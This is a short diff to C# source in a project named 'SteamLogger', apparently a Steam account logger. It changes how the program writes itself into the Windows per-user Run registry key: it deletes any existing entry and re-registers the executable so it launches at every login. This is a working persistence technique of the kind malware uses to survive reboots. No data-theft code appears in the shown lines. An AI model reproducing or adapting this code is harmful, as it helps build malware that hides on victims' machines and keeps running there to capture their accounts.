@@ -118,14 +118,16 @@ namespace SteamLogger
                 string b = Environment.CurrentDirectory+@"\SteamLogger.exe";
                 String fullPath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                 string a = (string)Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", "SteamLogger", "null");
-                if (a.Equals("null"))
+                RegistryKey reg;
+                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+                if (!a.Equals("null"))
                 {
-                    RegistryKey reg;
-                    reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
-                    reg.SetValue("SteamLogger", b);
-                    reg.Close();
+                    reg.DeleteValue("SteamLogger");
+
                 }
-                
+                reg.SetValue("SteamLogger", b);
+                reg.Close();
+
             }
             else
             {
